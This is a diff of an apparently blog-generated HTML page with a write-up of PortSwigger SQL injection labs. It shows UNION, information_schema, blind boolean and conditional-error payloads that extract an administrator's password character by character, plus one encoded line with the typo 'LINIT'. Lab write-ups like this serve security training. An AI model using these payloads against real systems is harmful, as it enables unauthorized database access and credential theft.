@@ -30,7 +30,7 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
 <meta property="article:published_time" content="2024-12-02T16:42:04.000Z">
-<meta property="article:modified_time" content="2024-12-08T15:31:55.716Z">
+<meta property="article:modified_time" content="2024-12-08T15:48:48.119Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="PortSwigger">
 <meta name="twitter:card" content="summary">
@@ -424,8 +424,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-12-08 23:31:55</span>
-            <span class="mobile">2024-12-08 23:31:55</span>
+            <span class="desktop">2024-12-08 23:48:48</span>
+            <span class="mobile">2024-12-08 23:48:48</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -557,7 +557,8 @@
 </tbody></table>
 <div style="text-align: justify">
 
-<p><code>dual</code> is a special table in Oracle database that contains only one row and one column. It’s commonly used when you need to execute SQL queries without accessing actual data tables - essentially acting as a dummy or temporary table.<br><code>&#39; UNION SELECT &#39;abc&#39; FROM dual</code></p>
+<p><code>dual</code> is a special table in Oracle database that contains only one row and one column. It’s commonly used when you need to execute SQL queries without accessing actual data tables - essentially acting as a dummy or temporary table.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT &#x27;</span>abc<span class="string">&#x27; FROM dual</span></span><br></pre></td></tr></table></figure></div>
 </div>
 
 <br>
@@ -582,11 +583,15 @@
 <td align="center"><code>SELECT version()</code></td>
 </tr>
 </tbody></table>
-<p><code>&#39; UNION SELECT banner,&#39;def&#39; FROM v$version--</code></p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION SELECT banner,&#x27;</span>def<span class="string">&#x27; FROM v$version--</span></span><br></pre></td></tr></table></figure></div>
+
 <br>
 
-<p>Query information_schema.tables to list the tables in the database.<br><code>SELECT * FROM information_schema.tables</code></p>
-<p>Query information_schema.columns to list the columns in individual tables.<br><code>SELECT * FROM information_schema.columns WHERE table_name = &#39;Users&#39;</code></p>
+<p>Query information_schema.tables to list the tables in the database.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.tables</span><br></pre></td></tr></table></figure></div>
+
+<p>Query information_schema.columns to list the columns in individual tables.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.columns <span class="keyword">WHERE</span> table_name <span class="operator">=</span> <span class="string">&#x27;Users&#x27;</span></span><br></pre></td></tr></table></figure></div>
 <p><br><br><br><br><br><br><br><br><br><br><br><br></p>
 <h4 id="Lab-Vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data"><a href="#Lab-Vulnerability-in-WHERE-clause-allowing-retrieval-of-hidden-data" class="headerlink" title="Lab: Vulnerability in WHERE clause allowing retrieval of hidden data"></a>Lab: Vulnerability in WHERE clause allowing retrieval of hidden data</h4><div style="text-align: justify">
 
@@ -721,9 +726,19 @@ Since the original query returns two columns and only the second column can stor
                       width="800" height="200"
                 ></p>
 <p>Use <code>&#39; and 1=1--</code> and encode it as <code>&#39;+and+1%3d1--</code>. The response should return “Welcome back”.</p>
-<p>Confirm the existence of the users table with the query<br><code>&#39; and (select &#39;x&#39; from users LIMIT 1)=&#39;x&#39;--</code>.<br>Encode it using (Ctrl+U) <code>&#39;+and+(select+&#39;x&#39;+from+users+LINIT+1)%3d&#39;x&#39;--</code>.</p>
-<p>Confirm the presence of username in the users table.<br><code>&#39; and (select username from users where username=&#39;administrator&#39;)=&#39;administrator&#39;--</code></p>
-<p>Confirm the presence of password in the users table.<br><code>&#39; and (select username from users where username=&#39;administrator&#39; and LENGTH(password)&gt;1)=&#39;administrator&#39;--</code><br>Password is exactly 20 characters.<br><img  
+<p>Confirm the existence of the users table with the query .</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select &#x27;</span>x<span class="string">&#x27; from users LIMIT 1)=&#x27;</span>x<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+<p>Encode it using (Ctrl+U).</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+and+(select+&#x27;</span>x<span class="string">&#x27;+from+users+LINIT+1)%3d&#x27;</span>x<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+
+
+<p>Confirm the presence of username in the users table.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select username from users where username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>administrator<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Confirm the presence of password in the users table.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select username from users where username=&#x27;</span>administrator<span class="string">&#x27; and LENGTH(password)&gt;1)=&#x27;</span>administrator<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+
+<p>Password is exactly 20 characters.<br><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/images/portswigger/0/9.png"
@@ -754,17 +769,20 @@ Since the original query returns two columns and only the second column can stor
                      data-src="/images/portswigger/0/14.png"
                       width="800" height="200"
                 ></p>
-<p><code>&#39; and (select substring(password,1,1) from users where username=&#39;administrator&#39;)=&#39;a&#39;--</code><br><img  
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and (select substring(password,1,1) from users where username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+<img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/images/portswigger/0/15.png"
                       width="800" height="200"
-                ><br><img  
+                >
+<img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/images/portswigger/0/16.png"
                       width="800" height="200"
-                ></p>
+                >
+
 <p>Switch to a Cluster Bomb attack.<br><img  
                      lazyload
                      src="/images/loading.svg"
@@ -799,11 +817,11 @@ Since the original query returns two columns and only the second column can stor
 </ul>
 <h4 id="Lab-Blind-SQL-injection-with-conditional-errors"><a href="#Lab-Blind-SQL-injection-with-conditional-errors" class="headerlink" title="Lab: Blind SQL injection with conditional errors"></a>Lab: Blind SQL injection with conditional errors</h4><div style="text-align: justify">
 
+<p>Start by using 1&#x3D;1 to test whether the database supports CASE conditional expressions and to determine if an error can be triggered when the condition is true. If an error occurs, it indicates that the condition holds true, ensuring that subsequent condition testing can proceed correctly.</p>
 <div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM dual)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
 
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN LENGTH(password)&gt;1 THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
-
-<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN LENGTH(password)&gt;100 THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+<p>Next, test the basic conditions of the target data, such as whether the password exists and meets fundamental criteria (e.g., length greater than 1). If the condition triggers an error, it confirms the existence of the data and its preliminary characteristics.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN LENGTH(password)&gt;1 THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">AND</span> (<span class="keyword">SELECT</span> <span class="keyword">CASE</span> <span class="keyword">WHEN</span> LENGTH(password)<span class="operator">&gt;</span><span class="number">100</span> <span class="keyword">THEN</span> TO_CHAR(<span class="number">1</span><span class="operator">/</span><span class="number">0</span>) <span class="keyword">ELSE</span> <span class="string">&#x27;a&#x27;</span> <span class="keyword">END</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;administrator&#x27;</span>)<span class="operator">=</span><span class="string">&#x27;a&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure></div>
 <img  
                      lazyload
                      src="/images/loading.svg"
@@ -817,8 +835,9 @@ Since the original query returns two columns and only the second column can stor
                       width="800" height="200"
                 >
 
-
-<p><code>&#39; AND (SELECT CASE WHEN LENGTH(password)&gt;$100$ THEN TO_CHAR(1/0) ELSE &#39;$a$&#39; END FROM users WHERE username=&#39;administrator&#39;)=&#39;a&#39;--</code><br><img  
+<p>This method leverages the conditional evaluation and error response characteristics of SQL Injection to iteratively test and infer the content of the target password.</p>
+<div class="code-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; AND (SELECT CASE WHEN SUBSTR(password,1,1)=&#x27;</span>a<span class="string">&#x27; THEN TO_CHAR(1/0) ELSE &#x27;</span>a<span class="string">&#x27; END FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a<span class="string">&#x27;--</span></span><br></pre></td></tr></table></figure></div>
+<p><code>&#39; AND (SELECT CASE WHEN SUBSTR(password,§1§,1)=&#39;§a§&#39; THEN TO_CHAR(1/0) ELSE &#39;a&#39; END FROM users WHERE username=&#39;administrator&#39;)=&#39;a&#39;--</code><br><img  
                      lazyload
                      src="/images/loading.svg"
                      data-src="/images/portswigger/0/24.png"
@@ -886,7 +905,7 @@ Since the original query returns two columns and only the second column can stor
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-12-08 23:31:55
+                    :</strong> 2024-12-08 23:48:48
             </li>
         
         <li>
